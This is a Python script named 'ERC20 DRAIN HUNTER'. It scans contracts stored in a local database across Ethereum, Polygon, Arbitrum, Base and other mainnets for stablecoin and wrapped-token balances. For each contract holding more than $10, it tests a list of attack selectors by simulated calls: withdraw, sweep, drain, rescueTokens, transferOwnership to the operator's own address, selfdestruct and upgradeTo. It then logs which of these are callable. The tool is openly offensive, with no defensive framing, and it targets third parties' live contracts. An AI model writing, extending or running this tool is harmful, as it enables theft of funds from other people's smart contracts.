"""
ERC20 DRAIN HUNTER — finds contracts holding tokens and tries EVERY attack vector.

Checks across ALL chains:
  1. Token balances (USDC, USDT, DAI, WETH, WBTC, WMATIC)
  2. Direct drain: withdraw, sweep, drain, transfer, rescueTokens
  3. Ownership hijack: transferOwnership, setOwner, acceptOwnership
  4. ERC20 permit: unstoppable allowance
  5. Logic bugs: burn, mint, initialize, upgrade
  6. Selfdestruct: kill, destroy, suicide

Usage: python erc20_drain_hunter.py <chain|all> [--drain]
"""
import sqlite3, time, logging, json, urllib.request
from typing import Optional
from src.rpc import RpcClient
from src.signer import load_evm_private_key

logging.basicConfig(level=logging.INFO, format="%(asctime)s [DRAIN] %(message)s")
logger = logging.getLogger("erc20-drain")

# Chains + public RPCs
CHAINS = {
    "ethereum": "https://ethereum-rpc.publicnode.com",
    "polygon": "https://polygon-bor.publicnode.com",
    "arbitrum": "https://arb1.arbitrum.io/rpc",
    "base": "https://mainnet.base.org",
    "bsc": "https://bsc-dataseed.binance.org",
    "optimism": "https://mainnet.optimism.io",
    "avalanche": "https://api.avax.network/ext/bc/C/rpc",
}

# Tokens to check (top stable + wrapped)
TOKENS = {
    "ethereum": [
        ("USDC", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6),
        ("USDT", "0xdAC17F958D2ee523a2206206994597C13D831ec7", 6),
        ("DAI", "0x6B175474E89094C44Da98b954EedeAC495271d0F", 18),
        ("WETH", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", 18),
        ("WBTC", "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", 8),
    ],
    "polygon": [
        ("USDC", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", 6),
        ("USDT", "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6),
        ("DAI", "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", 18),
        ("WETH", "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", 18),
        ("WMATIC", "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", 18),
    ],
    "arbitrum": [
        ("USDC", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", 6),
        ("USDT", "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6),
        ("DAI", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", 18),
        ("WETH", "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", 18),
    ],
    "base": [
        ("USDC", "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6),
        ("WETH", "0x4200000000000000000000000000000000000006", 18),
    ],
}

# Default tokens for chains without specific list
DEFAULT_TOKENS = [("USDC", None, 6), ("USDT", None, 6), ("WETH", None, 18)]

# ALL attack selectors — every possible drain vector
ATTACK_VECTORS = [
    # Direct drain
    ("2e1a7d4d", "withdraw(uint256)", "0"*64, "CRITICAL"),
    ("3ccfd60b", "withdraw()", "", "CRITICAL"),
    ("853828b6", "withdrawAll()", "", "CRITICAL"),
    ("f14210a6", "withdrawAll()", "", "CRITICAL"),
    ("db2e21bc", "emergencyWithdraw()", "", "CRITICAL"),
    ("ecf708a4", "sweep()", "", "CRITICAL"),
    ("9890220b", "drain()", "", "CRITICAL"),
    ("7a9c2b39", "rescueTokens(address)", "", "CRITICAL"),
    ("3996ac90", "rescueERC20(address,address,uint256)", "", "CRITICAL"),
    ("d0def521", "claimTokens()", "", "HIGH"),
    # Ownership
    ("f2fde38b", "transferOwnership", "", "CRITICAL"),
    ("13af4035", "setOwner", "", "CRITICAL"),
    ("a6f9dae1", "setOwner", "", "CRITICAL"),
    ("79ba5097", "acceptOwnership", "", "CRITICAL"),
    ("715018a6", "renounceOwnership", "", "HIGH"),
    # Selfdestruct
    ("41c0e1b5", "kill()", "", "CRITICAL"),
    ("83197ef0", "destroy()", "", "CRITICAL"),
    ("9d118770", "suicide()", "", "CRITICAL"),
    # Proxy
    ("3659cfe6", "upgradeTo", "", "CRITICAL"),
    ("8129fc1c", "initialize()", "", "HIGH"),
    # Config
    ("9f1a54a1", "setFee", "", "MEDIUM"),
    ("bddb1f23", "setSwapFee", "", "MEDIUM"),
    # Misc
    ("8456cb59", "pause()", "", "HIGH"),
    ("3f4ba83a", "unpause()", "", "HIGH"),
]


def check_token_balance(rpc: RpcClient, addr: str, token_addr: str) -> float:
    """Check ERC20 balance."""
    try:
        r = rpc.call('eth_call', [{'to': token_addr, 'data': '0x70a08231' + addr[2:].lower().zfill(64)}, 'latest'])
        return int(str(r), 16)
    except:
        return 0


def try_all_attacks(rpc: RpcClient, addr: str, signer_addr: str) -> list[str]:
    """Try every attack vector on a contract."""
    hits = []
    for sel, name, arg, severity in ATTACK_VECTORS:
        calldata = "0x" + sel
        # For functions that take address: append signer address
        if sel in ("f2fde38b", "13af4035", "a6f9dae1", "7a9c2b39", "3996ac90"):
            calldata = "0x" + sel + signer_addr[2:].lower().zfill(64)
        elif sel == "2e1a7d4d":
            calldata = "0x" + sel + "0"*64  # withdraw(0)
        try:
            result = rpc.eth_call(addr, calldata, from_address=signer_addr)
            if result and result != "0x":
                g = 0
                try: g = int(str(result), 16)
                except: pass
                hits.append(f"{severity} {name} CALLABLE gas={g}")
        except:
            pass
    return hits


def hunt_chain(chain: str, rpc_url: str, drain: bool):
    """Hunt all contracts on one chain for token balances + drain opportunities."""
    rpc = RpcClient(rpc_url, max_retries=2)
    signer = load_evm_private_key()
    signer_addr = signer.address if signer else ""
    
    tokens = TOKENS.get(chain, DEFAULT_TOKENS)
    
    db = sqlite3.connect("scanner.db")
    rows = db.execute(
        f"SELECT DISTINCT address FROM contract_targets WHERE chain=? ORDER BY RANDOM() LIMIT 300",
        (chain,)
    ).fetchall()
    
    logger.info("=" * 60)
    logger.info("%s: %d contracts, %d tokens to check", chain.upper(), len(rows), len(tokens))
    
    token_hits = []
    scanned = 0
    
    for (addr,) in rows:
        try:
            code = rpc.eth_get_code(addr)
            if not code or len(str(code)) <= 10:
                continue
        except:
            continue
        
        scanned += 1
        
        # Check token balances
        total_value = 0
        contract_tokens = []
        for sym, t_addr, dec in tokens:
            if not t_addr:
                continue
            bal_wei = check_token_balance(rpc, addr, t_addr)
            if bal_wei > 0:
                human = bal_wei / (10**dec)
                value_usd = human * (3500 if sym == "WETH" or sym == "WMATIC" else 1)
                total_value += value_usd
                contract_tokens.append((sym, human, value_usd, t_addr))
        
        if total_value < 10:  # skip if less than $10
            continue
        
        # Has money! Try ALL attacks
        attacks = try_all_attacks(rpc, addr, signer_addr)
        if attacks:
            token_hits.append((addr, contract_tokens, attacks))
            logger.warning("💰 %s $%.0f: %d attacks work!", addr[:14], total_value, len(attacks))
            for att in attacks:
                logger.warning("  🚨 %s", att)
            for sym, human, usd, _ in contract_tokens:
                logger.info("  %s: %.2f ($%.0f)", sym, human, usd)
        
        if scanned % 50 == 0:
            logger.info("  Scanned: %d | Hits: %d", scanned, len(token_hits))
    
    db.close()
    
    if token_hits:
        with open(f"erc20_drain_{chain}.txt", "w") as f:
            for addr, tokens, attacks in token_hits:
                f.write(f"{addr}\n")
                for sym, bal, usd, _ in tokens:
                    f.write(f"  {sym}: {bal:.2f} (${usd:.0f})\n")
                for att in attacks:
                    f.write(f"  {att}\n")
                f.write("\n")
    
    logger.info("%s DONE: %d contracts with tokens, %d with attacks", chain, len(token_hits), len(token_hits))


def main():
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "all"
    drain = "--drain" in sys.argv
    
    chains_list = list(CHAINS.keys()) if target == "all" else [target]
    
    for chain in chains_list:
        if chain in CHAINS:
            hunt_chain(chain, CHAINS[chain], drain)


if __name__ == "__main__":
    main()
